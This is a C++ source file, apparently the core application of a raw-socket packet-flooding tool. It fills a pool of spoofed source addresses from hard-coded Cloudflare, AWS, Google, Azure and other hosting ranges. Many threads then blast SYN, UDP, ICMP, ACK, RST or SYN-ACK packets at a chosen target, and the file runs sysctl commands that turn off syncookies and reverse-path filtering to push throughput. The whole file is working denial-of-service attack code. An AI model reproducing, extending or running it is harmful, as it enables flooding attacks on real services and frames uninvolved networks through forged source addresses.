#include "app/application.hpp"
#include "app/thread_affinity.hpp"
#include "common/constants.hpp"
#include "common/types.hpp"
#include "common/platform.hpp"
#include "config/config.hpp"
#include "protocol/ipv4.hpp"
#include "protocol/tcp.hpp"
#include "protocol/checksum.hpp"
#include "packet/packet.hpp"
#include "packet/packet_strategy.hpp"
#include "packet/tcp_syn_strategy.hpp"
#include "packet/udp_strategy.hpp"
#include "packet/icmp_strategy.hpp"
#include "packet/ack_strategy.hpp"
#include "packet/rst_strategy.hpp"
#include "packet/synack_strategy.hpp"
#include "transport/packet_transport.hpp"
#include "transport/file_transport.hpp"
#include "monitor/monitor_factory.hpp"
#include "random/fast_random.hpp"

#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <memory>
#include <csignal>
#include <cstring>
#include <cstdlib>
#include <cerrno>
#include <chrono>
#include <system_error>

namespace {

std::atomic<bool> g_running{true};
std::atomic<std::uint64_t> g_total_packets{0};
std::atomic<std::uint64_t> g_total_errors{0};
std::atomic<std::uint32_t> g_threads_ready{0};
std::atomic<std::uint32_t> g_threads_failed{0};

[[maybe_unused]] void run_cmd(const char* cmd) {
    int ret = std::system(cmd);
    (void)ret;
}

void signal_handler(int) {
    g_running = false;
}

// Spoof IP pool — power-of-2 for bitmask indexing
alignas(64) std::uint32_t g_spoof_ips[common::SPOOF_BUF_SIZE];
std::uint32_t g_spoof_count = 0;

void generate_spoof_ips() {
    const std::vector<std::string> ranges = {
        "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
        "141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20",
        "104.16.0.0/13", "104.24.0.0/14", "172.64.0.0/13",
        "13.32.0.0/15", "13.248.0.0/14", "18.34.0.0/19",
        "18.144.0.0/15", "34.192.0.0/12", "35.152.0.0/13", "52.0.0.0/10",
        "8.8.8.0/24", "8.8.4.0/24", "34.64.0.0/11", "35.184.0.0/13",
        "13.64.0.0/11", "20.0.0.0/10", "40.64.0.0/10", "51.0.0.0/10",
        "5.39.0.0/17", "46.105.0.0/16", "51.38.0.0/16", "91.121.0.0/16",
        "137.74.0.0/16", "142.44.0.0/16", "149.202.0.0/16", "158.69.0.0/16",
        "64.225.0.0/18", "68.183.0.0/16", "104.131.0.0/16",
        "128.199.0.0/16", "134.209.0.0/16", "139.59.0.0/16",
        "142.93.0.0/16", "157.230.0.0/16", "159.65.0.0/16",
        "164.90.0.0/16", "167.99.0.0/16", "188.166.0.0/16",
        "192.241.0.0/16", "198.199.0.0/16"
    };

    std::cout << "  Generating spoof IPs from " << ranges.size() << " ranges..." << std::endl;
    std::uint32_t count = 0;

    for (const auto& range : ranges) {
        auto slash = range.find('/');
        if (slash == std::string::npos) continue;

        std::string ip_str = range.substr(0, slash);
        int prefix = std::stoi(range.substr(slash + 1));
        struct in_addr addr;
        if (inet_pton(AF_INET, ip_str.c_str(), &addr) != 1) continue;

        std::uint32_t network = ntohl(addr.s_addr);
        std::uint32_t mask = (prefix == 0) ? 0 : (0xFFFFFFFF << (32 - prefix));
        std::uint32_t start = network & mask;
        std::uint32_t end = start | ~mask;

        for (std::uint32_t ip = start; ip <= end && count < common::MAX_SPOOF_IPS; ip++) {
            g_spoof_ips[count++] = htonl(ip);
        }
    }

    std::uint32_t pow2 = 1;
    while (pow2 < count) pow2 <<= 1;
    randomgen::FastRandom pad_rng(count);
    for (std::uint32_t i = count; i < pow2; i++) {
        g_spoof_ips[i] = g_spoof_ips[pad_rng.next() % count];
    }
    g_spoof_count = pow2;
    std::cout << "  Total spoof IPs: " << count << " (padded to " << pow2 << ")" << std::endl;
}

#if QEVORYX_PLATFORM_LINUX
// Get real IP from network interface (Linux only)
std::uint32_t get_real_ip(const std::string& interface_name) {
    struct ifaddrs* ifaddr = nullptr;
    std::uint32_t result = 0;

    if (getifaddrs(&ifaddr) == -1) return 0;

    for (struct ifaddrs* ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;
        if (ifa->ifa_name != interface_name) continue;

        auto* sa = reinterpret_cast<struct sockaddr_in*>(ifa->ifa_addr);
        result = sa->sin_addr.s_addr;
        break;
    }

    freeifaddrs(ifaddr);
    return result;
}
#else
// Windows: real IP detection via GetAdaptersAddresses
std::uint32_t get_real_ip(const std::string& interface_name) {
    ULONG buf_size = 15000;
    IP_ADAPTER_ADDRESSES* adapters = nullptr;
    DWORD result = ERROR_BUFFER_OVERFLOW;

    for (int attempt = 0; attempt < 4 && result == ERROR_BUFFER_OVERFLOW; ++attempt) {
        adapters = static_cast<IP_ADAPTER_ADDRESSES*>(std::malloc(buf_size));
        if (!adapters) {
            return 0;
        }

        result = GetAdaptersAddresses(AF_INET,
                                      GAA_FLAG_SKIP_ANYCAST |
                                      GAA_FLAG_SKIP_MULTICAST |
                                      GAA_FLAG_SKIP_DNS_SERVER,
                                      nullptr,
                                      adapters,
                                      &buf_size);
        if (result == ERROR_BUFFER_OVERFLOW) {
            std::free(adapters);
            adapters = nullptr;
        }
    }

    if (result != NO_ERROR) {
        std::free(adapters);
        return 0;
    }

    std::uint32_t ip = 0;
    for (auto* adapter = adapters; adapter != nullptr; adapter = adapter->Next) {
        // Convert FriendlyName (wchar_t*) to std::string for comparison
        std::string friendly;
        if (adapter->FriendlyName) {
            int len = WideCharToMultiByte(CP_UTF8, 0, adapter->FriendlyName, -1, nullptr, 0, nullptr, nullptr);
            if (len > 0) {
                friendly.resize(len - 1);
                WideCharToMultiByte(CP_UTF8, 0, adapter->FriendlyName, -1, friendly.data(), len, nullptr, nullptr);
            }
        }

        // Match by FriendlyName only (AdapterName is a GUID, not useful)
        if (friendly == interface_name) {
            for (auto* ua = adapter->FirstUnicastAddress; ua != nullptr; ua = ua->Next) {
                if (ua->Address.lpSockaddr->sa_family == AF_INET) {
                    auto* sa = reinterpret_cast<struct sockaddr_in*>(ua->Address.lpSockaddr);
                    ip = sa->sin_addr.s_addr;
                    break;
                }
            }
            if (ip != 0) break;
        }
    }

    std::free(adapters);
    return ip;
}
#endif

} // anonymous namespace

namespace app {

void Application::request_stop() {
    g_running = false;
}

std::uint64_t Application::generated_packets() {
    return g_total_packets.load();
}

std::uint64_t Application::error_count() {
    return g_total_errors.load();
}

Application::Application(config::Config config, bool install_signal_handlers)
    : config_(std::move(config)), install_signal_handlers_(install_signal_handlers) {
    g_running = true;
    g_total_packets = 0;
    g_total_errors = 0;
    g_threads_ready = 0;
    g_threads_failed = 0;
}

int Application::run() {
    if (install_signal_handlers_) {
        signal(SIGINT, signal_handler);
        signal(SIGTERM, signal_handler);
    }

#if QEVORYX_PLATFORM_LINUX
    if (geteuid() != 0) {
        std::cerr << "  Must be run as root for raw sockets!" << std::endl;
        return 1;
    }
#endif

#if QEVORYX_PLATFORM_WINDOWS
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "  WSAStartup failed!" << std::endl;
        return 1;
    }
#endif

    if (!initialize()) {
#if QEVORYX_PLATFORM_WINDOWS
        WSACleanup();
#endif
        return 1;
    }

    if (!create_workers()) {
        shutdown();
#if QEVORYX_PLATFORM_WINDOWS
        WSACleanup();
#endif
        return 1;
    }

    {
        start_monitor();
        wait_for_shutdown();
        shutdown();
    }

#if QEVORYX_PLATFORM_WINDOWS
    WSACleanup();
#endif

    return 0;
}

bool Application::initialize() {
    if (config_.use_spoof_ips) {
        generate_spoof_ips();
    } else {
        std::uint32_t real_ip = get_real_ip(config_.real_ip_interface);
        if (real_ip == 0) {
            std::cerr << "  Could not get IP for interface: " << config_.real_ip_interface << std::endl;
            std::cerr << "  Use --spoof to explicitly enable spoofed source mode" << std::endl;
            return false;
        } else {
            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &real_ip, ip_str, INET_ADDRSTRLEN);
            std::cout << "  Using real IP: " << ip_str << " (interface: " << config_.real_ip_interface << ")" << std::endl;
        }
    }

#if QEVORYX_PLATFORM_LINUX
    // Kernel tuning (Linux only)
    run_cmd("sysctl -w net.ipv4.tcp_tw_reuse=1 > /dev/null 2>&1");
    run_cmd("sysctl -w net.ipv4.tcp_fin_timeout=5 > /dev/null 2>&1");
    run_cmd("sysctl -w net.ipv4.tcp_timestamps=0 > /dev/null 2>&1");
    run_cmd("sysctl -w net.core.rmem_max=268435456 > /dev/null 2>&1");
    run_cmd("sysctl -w net.core.wmem_max=268435456 > /dev/null 2>&1");
    run_cmd("sysctl -w net.core.netdev_max_backlog=500000 > /dev/null 2>&1");
    run_cmd("sysctl -w net.ipv4.ip_local_port_range=\"1024 65535\" > /dev/null 2>&1");
    run_cmd("sysctl -w net.ipv4.conf.all.rp_filter=0 > /dev/null 2>&1");
    run_cmd("sysctl -w net.ipv4.tcp_max_syn_backlog=500000 > /dev/null 2>&1");
    run_cmd("sysctl -w net.ipv4.tcp_syncookies=0 > /dev/null 2>&1");
    run_cmd("ulimit -n 2000000 > /dev/null 2>&1");
#else
    // Windows: set send buffer size via setsockopt (done per-socket below)
#endif

    return true;
}

bool Application::create_workers() {
    std::cout << "\n  Starting " << config_.worker_count << " workers..." << std::endl;

    const std::shared_ptr<packet::PacketStrategy> strategy =
        packet::create_strategy(config_.packet_mode);

    // Get real IP if needed
    std::uint32_t real_ip = 0;
    if (!config_.use_spoof_ips) {
        real_ip = get_real_ip(config_.real_ip_interface);
    }

    workers_.clear();
    workers_.reserve(config_.worker_count);

    std::uint32_t destination_ip = 0;
    {
        struct in_addr addr {};
        if (inet_pton(AF_INET, config_.target_ip.c_str(), &addr) != 1) {
            std::cerr << "  Invalid target IP: " << config_.target_ip << std::endl;
            return false;
        }
        destination_ip = addr.s_addr;
    }

    try {
    for (std::uint32_t i = 0; i < config_.worker_count; i++) {
        workers_.emplace_back([this, strategy, i, real_ip, destination_ip]() {
            app::pin_current_thread(i);

#if QEVORYX_PLATFORM_WINDOWS
            SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
            const bool socket_failed = (sock == INVALID_SOCKET);
#else
            int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            const bool socket_failed = (sock < 0);
#endif
            if (socket_failed) {
#if QEVORYX_PLATFORM_WINDOWS
                int err = WSAGetLastError();
                if (i == 0) std::cerr << "  Worker 0: socket() failed (WSA error " << err << ")" << std::endl;
#else
                if (i == 0) std::cerr << "  Worker 0: socket() failed: " << strerror(errno) << std::endl;
#endif
                g_threads_ready++;
                g_threads_failed++;
                return;
            }

            int one = 1;
            if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, reinterpret_cast<const char*>(&one), sizeof(one)) != 0 ||
                setsockopt(sock, SOL_SOCKET, SO_SNDBUF, reinterpret_cast<const char*>(&common::SEND_BUF_SIZE), sizeof(common::SEND_BUF_SIZE)) != 0) {
                if (i == 0) {
                    std::cerr << "  Worker 0: setsockopt() failed" << std::endl;
                }
                QEVORYX_CLOSESOCK(sock);
                g_threads_ready++;
                g_threads_failed++;
                return;
            }

            g_threads_ready++;

            randomgen::FastRandom rng(std::time(nullptr) ^ (i * 0x9e3779b97f4a7c15ULL));
            common::PacketBuffer buffer;
            std::uint64_t local_packets = 0;
            auto window_start = std::chrono::steady_clock::now();
            std::uint64_t window_packets = 0;

            struct sockaddr_in sin{};
            sin.sin_family = AF_INET;
            sin.sin_port = htons(config_.target_port);
            sin.sin_addr.s_addr = destination_ip;

            packet::PacketContext ctx{config_, rng, destination_ip};

            while (g_running) {
                bool sent = strategy->build(ctx, buffer);
                if (!sent) {
                    g_total_errors++;
                    continue;
                }

                // If using real IP, overwrite source IP in the built packet
                if (sent && !config_.use_spoof_ips && real_ip != 0) {
                    auto* iph = reinterpret_cast<protocol::IPv4Header*>(buffer.ptr());
                    iph->source = real_ip;
                    if (iph->protocol == protocol::IPPROTO_VALUE_TCP) {
                        auto* tcph = reinterpret_cast<protocol::TcpHeader*>(buffer.ptr() + protocol::IPv4_HEADER_SIZE);
                        tcph->checksum = 0;
                        tcph->checksum = protocol::tcp_checksum(
                            buffer.ptr() + protocol::IPv4_HEADER_SIZE,
                            buffer.size - protocol::IPv4_HEADER_SIZE,
                            real_ip, iph->destination);
                    }
                }

                if (sent) {
                    int ret = sendto(sock, reinterpret_cast<const char*>(buffer.ptr()),
                                   static_cast<int>(buffer.size), 0,
                                   reinterpret_cast<struct sockaddr*>(&sin), sizeof(sin));
                        if (ret > 0) {
                            g_total_packets++;
                            local_packets++;
                            window_packets++;
                        } else {
                            g_total_errors++;
#if QEVORYX_PLATFORM_WINDOWS
                            int err = WSAGetLastError();
                            if (i == 0 && local_packets == 0) {
                                std::cerr << "  Worker 0: sendto() failed (WSA error " << err << ")" << std::endl;
                            }
#else
                            if (i == 0 && local_packets == 0) {
                                std::cerr << "  Worker 0: sendto() failed: " << strerror(errno) << std::endl;
                            }
#endif
                        }
                }

                if (config_.rate_limit > 0 && window_packets >= config_.rate_limit) {
                    const auto window_end = window_start + std::chrono::seconds(1);
                    const auto now = std::chrono::steady_clock::now();
                    if (now < window_end && g_running) {
                        std::this_thread::sleep_until(window_end);
                    }
                    window_start = window_end;
                    window_packets = 0;
                }
            }

            QEVORYX_CLOSESOCK(sock);
        });

        if (i % 100 == 0) { std::cout << "."; std::cout.flush(); }
        std::this_thread::sleep_for(std::chrono::microseconds(5));
    }
    } catch (const std::system_error& error) {
        std::cerr << "  Failed to create workers: " << error.what() << std::endl;
        g_running = false;
        return false;
    }

    std::cout << " READY!\n" << std::endl;

    while (g_threads_ready < config_.worker_count)
        std::this_thread::sleep_for(std::chrono::milliseconds(10));

    if (g_threads_failed.load() >= config_.worker_count) {
        std::cerr << "  All workers failed to start\n" << std::endl;
        return false;
    }

    std::cout << "  All workers ready - generating packets!\n" << std::endl;

    return true;
}

void Application::start_monitor() {
    auto mon = monitor::create_monitor(config_.monitor_mode);
    mon->start(config_);

    while (g_running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        monitor::MonitorSnapshot snap{
            g_total_packets.load(),
            g_total_errors.load()
        };
        mon->update(snap);
    }

    mon->stop();
}

void Application::wait_for_shutdown() {
    while (g_running)
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
}

void Application::shutdown() {
    for (auto& worker : workers_) {
        if (worker.joinable()) {
            worker.join();
        }
    }

    std::cout << "\n\n  Final total: " << g_total_packets.load() << " packets" << std::endl;
}

} // namespace app
